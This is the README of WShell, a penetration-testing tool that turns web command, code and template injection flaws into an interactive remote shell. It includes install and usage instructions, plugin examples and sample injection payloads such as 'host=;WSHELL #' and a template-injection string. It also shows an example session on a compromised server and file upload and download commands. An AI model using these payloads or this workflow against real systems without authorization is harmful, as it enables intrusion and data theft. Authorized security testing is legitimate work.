# WShell

[![Python 3](https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white)](https://docs.python.org/3/)
[![WShell License](https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License&color=red)](https://github.com/unlock-security/wshell?tab=GPL-3.0-1-ov-file#readme)
[![GitHub Release](https://img.shields.io/github/v/release/unlock-security/wshell?include_prereleases&sort=semver&display_name=release&style=for-the-badge)](https://github.com/unlock-security/wshell/releases/latest)
[![Made by 🔓 Unlock Security](https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge)](https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell)

WShell lets you turn a web-based {code,command,template} injection in a full-featured shell with ease.

## How it works

WShell is a post-exploitation tool for web-based remote command execution (RCE) vulnerabilities.
It provides an agentless, language-agnostic, interactive pseudo-shell that feels like a real shell.
When you run a command, WShell wraps it in a HTTP request and parse the HTTP response to get you
only the command output.

It can automatically find out what is the underlying operating system (OS) and adjust the shell
prompt and other internal behavior accordingly.

Unlike a standard web shell, WShell can handle commands like `cd` and a persistent commands history.

To make it works, you just have to specify the vulnerable URL, the necessary headers, HTTP
parameters and where to put the command to execute.

As an example, to exploit a command injection in a vulnerable `ping` functionality you can do this:

```shell
attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.php?count=3' 'host=;WSHELL #'

[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters
[13:37:00] [INFO] Target OS not specified, trying to automatically detect it
[13:37:00] [INFO] Target OS detected as Linux

www-data@app:/var/www/app/vulnerable$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@app:/var/www/app/vulnerable$ cd ../../
/var/www

www-data@app:/var/www$ ls -al
total 20
drwxrwx---  8 www-data www-data 4096 Mar  7 23:49 .
drwxr-xr-x 14 root     root     4096 Mar 18 13:37 ..
drwxrwx--- 25 www-data www-data 4096 Feb 18 15:31 app
```

## Install

```shell
pipx install git+https://git@github.com/unlock-security/wshell
```

## Development

```
git clone https://github.com/unlock-security/wshell
cd wshell/
python3 -m virtualenv .venv
source .venv/bin/activate
pip install -e .
```

## Usage

```
usage: wshell [-h] [-v] [--placeholder COMMAND_PLACEHOLDER] [--os {linux,win-cmd,win-psh}] [-m METHOD] [-t SECONDS] [--keep-alive] [--follow] [-ua USER_AGENT | -r] [-j | -f]
              [--log {critical,error,warning,info,debug}] [--list-scripts] [--input-scripts INPUT_SCRIPTS] [--output-scripts OUTPUT_SCRIPTS]
              URL [REQUEST ITEMS ...]

Turn a web-based {code,command,template} injection in a full featured shell with ease

positional arguments:
  URL                   The endpoint URL where the injection is
  REQUEST ITEMS         POST data and headers ('key=value' for data, 'key:value' for headers)

options:
  -h, --help            show this help message and exit
  -v, --version         Show the version number and exit
  --placeholder COMMAND_PLACEHOLDER
                        Use a custom command placeholder (default: WSHELL)
  --os {linux,win-cmd,win-psh}
                        Specify OS and shell in use on the target (default: auto-discover)

HTTP arguments:
  -m, --method METHOD   The HTTP method to be used for the requests (Default: POST if there is some data, GET otherwise)
  -t, --timeout SECONDS
                        The connection timeout of the request in seconds (default: 3.0)
  --no-timeout          Disable the connection timeout
  --keep-alive          Use persistent connection (default: True)
  --follow              Follow 30x Location redirects (default: True)
  -ua, --user-agent USER_AGENT
                        Use a custom User-Agent (default: WShell v0.1.0-beta)
  -r, --random-agent    Use a random valid browser User-Agent
  -j, --json            Data items from the command line are serialized as a JSON object (default: False)
  -f, --form            Data items from the command line are serialized as form fields

Logging arguments:
  --log {critical,error,warning,info,debug}
                        To specify the log messages level

Input/Output scripts:
  --list-scripts        List the available scripts to manipulate input/output
  --input-scripts INPUT_SCRIPTS
                        Use one or more custom input script (comma separated, order matters)
  --output-scripts OUTPUT_SCRIPTS
                        Use one or more custom output script (comma separated, order matters)

For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT

Example usage:

    wshell 'https://www.example.com/webshell?cmd=WSHELL'
    wshell --form 'https://www.example.com/command-injection' 'p=;WSHELL #'
    wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("WSHELL")}'
```

## Scripts

WShell can run input and output scripts which are simple functions used to manipulate input command and output response.
As an example, if the vulnerable page returns a base64-encoded result you can use `--output-scripts base64_decode` to get
the output as plain text.

Scripts can be chained and used more than once, for instance is totally fine to do something like `--output-scripts unescape,base64_decode,base64_decode`.

### Developing a script

Developing a script for WShell is straightforward, just add a python file in `wshell/scripts/input` or `wshell/scripts/output` folder. The file name will
be the name used to invoke the script from the command line (e.g. if you create `wshell/scripts/output/test.py` you can invoke it with `--output-scripts test`).

Inside the file you have to create a function with the following signature `run(str) -> str`. A docstring to use as a description for the script is mandatory.

As an example, the `base64_decode` output script corresponds to `wshell/scripts/output/base64_decode.py` and it is implemented like this:

```py
import base64


def run(output: str) -> str:
    """Base64 decode output (requires --os to work)"""
    return base64.b64decode(output, validate=False).decode("utf-8", "ignore")
```

## Custom commands

Custom commands are special commands that you can run within the WShell prompt. They are not executed on the target system but within WShell itself. These commands are useful for performing actions that are not directly related to the remote shell, such as uploading or downloading files, or managing WShell's state.
For instance, the built-in `download` command abstracts away the complexity of exfiltrating a file from different operating systems, providing a consistent interface for the user.

WShell automatically discovers and registers any custom command placed in a subdirectory of `wshell/commands`.
You can check all the available custom commands by typing `help -v` in a WShell prompt:

```sh
victim@vulnerable-server:/var/www/html/$ help -v

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

File transfer
======================================================================================================
download              Download remote file
upload                Upload local file

Uncategorized
======================================================================================================
help                  List available commands or provide detailed help for a specific command
history               View, run, edit, save, or clear previously entered commands
quit                  Exit this application
set                   Set a settable parameter or show current settings of parameters.
shell                 Execute a command as if at the OS prompt
```

A custom command can have its own help message and parameters:

```sh
victim@vulnerable-server:/var/www/html/$ download -h
usage: download [-h] -r FILENAME [-l FILENAME] [-c SIZE | -n]

Download remote file

options:
  -h, --help            show this help message and exit
  -r, --remote FILENAME
                        Remote file to download
  -l, --local FILENAME  Local file where to store the downloaded file (default: current folder, same name as remote)
  -c, --chunk SIZE      Size of the chunk to download in bytes (default: 1024)
  -n, --no-chunk        Do not split into chunks
```

### Developing a custom command

To create a custom command, you need to create a new Python file with the name of your choice in a subdirectory of `wshell/commands` (e.g., `wshell/commands/system/my_command.py`). The subdirectory (`system` in this case) will be its category.

Inside the file, create a class that inherits from `wshell.commands.WShellCommandSet`, then you can follow the cmd2's [Modular Commands documentation](https://cmd2.readthedocs.io/en/stable/features/modular_commands/) for the specification.

Basically, you just need to implement a method starting with `do_` for each command you want to add. For example, a `do_phpinfo` method will create a `phpinfo` command.

Here is an example of a simple `phpinfo` command that create a PHP file named `info.php` executing `phpinfo()` in the current directory:

```python
# wshell/commands/php/phpinfo.py
import argparse

from cmd2 import with_argparser

from wshell.commands import WShellCommandSet


class PHPInfoCommandSet(WShellCommandSet):

    argument_parser = argparse.ArgumentParser(description="Create a new file into the current directory that executes `phpinfo()`")
    argument_parser.add_argument(
        "-f", "--filename",
        metavar="FILENAME",
        required=False,
        help="Name of the file",
        dest="filename",
        default="info.php"
    )

    @with_argparser(argument_parser)
    def do_phpinfo(self, args) -> None:
        file_content = "<?php phpinfo();"
        self._dispatch("write_phpinfo_file", args.filename, file_content)

    def _linux_write_phpinfo_file(self, filename, file_content):
      self._cmd.injector.execute(f"echo -n '{file_content}' > {filename}")

    def _win_psh_write_phpinfo_file(self, filename, file_content):
      self._cmd.injector.execute(f"Set-Content -Path '{filename}' -Value '{file_content}'")

    def _win_cmd_write_phpinfo_file(self, filename, file_content):
      self._cmd.injector.execute(f"echo {file_content} > {filename}")
```

To make this command available in WShell in the `Php` category, you would save it as `wshell/commands/php/phpinfo.py`. Then, from the WShell prompt, you could run it by just typing `phpinfo`.

On top of `cmd2`'s modular command features, WShell overrides the `_cmd` object of the command set to provides access to the current WShell session, including the HTTP client (`self._cmd.injector`), target information, and more. This is useful for creating more complex commands that run commands on the remote system.

For more complex examples, see the implementation of the built-in `upload` and `download` commands in the `wshell/commands/file_transfer` directory.

## Contributing

Have a look through existing [Issues](https://github.com/unlock-security/wshell/issues) and [Pull Requests](https://github.com/unlock-security/wshell/pulls) that you could help with.
If you'd like to request a feature or report a bug, please [create a GitHub Issue]() using one of the templates provided.

[See contribution guide →](https://github.com/unlock-security/wshell/blob/main/CONTRIBUTING.md)

---

<p align="center">Made with 💙 by Unlock Security</p>
<p align="center">
  <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank" rel="noopener">
    <img src="https://www.unlock-security.it/wp-content/uploads/2022/12/logo.svg" width="150">
  </a>
</p>
